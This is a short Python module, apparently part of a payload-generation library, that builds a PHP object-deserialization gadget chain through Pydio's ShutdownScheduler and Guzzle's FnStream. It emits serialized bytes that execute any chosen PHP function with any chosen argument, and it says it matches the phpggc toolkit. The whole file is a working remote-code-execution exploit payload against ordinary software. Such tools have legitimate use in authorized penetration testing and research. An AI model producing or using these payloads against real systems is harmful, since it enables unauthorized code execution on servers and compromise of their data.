"""Pydio + Guzzle gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_arr, php_int, php_obj, php_obj_ref, php_str, priv


def build_guzzle_rce1(function: str, parameter: str, *, fast_destruct: bool = False) -> bytes:
    scheduler = php_obj("Pydio\\Core\\Controller\\ShutdownScheduler", [
        (priv("Pydio\\Core\\Controller\\ShutdownScheduler", "callbacks"), php_arr([
            (php_int(0), php_arr([
                (php_int(0), php_str(function)),
                (php_int(1), php_str(parameter)),
            ])),
        ])),
    ])
    methods_entry = php_arr([
        (php_int(0), scheduler),
        (php_int(1), php_str("callRegisteredShutdown")),
    ])
    ref = php_obj_ref(4 + (1 if fast_destruct else 0))
    stream = php_obj("GuzzleHttp\\Psr7\\FnStream", [
        (priv("GuzzleHttp\\Psr7\\FnStream", "methods"), php_arr([
            (php_str("__toString"), methods_entry),
        ])),
        ("_fn___toString", php_arr([
            (php_int(0), ref),
            (php_int(1), php_str("callRegisteredShutdown")),
        ])),
    ])
    return maybe_wrap(stream, fast_destruct)
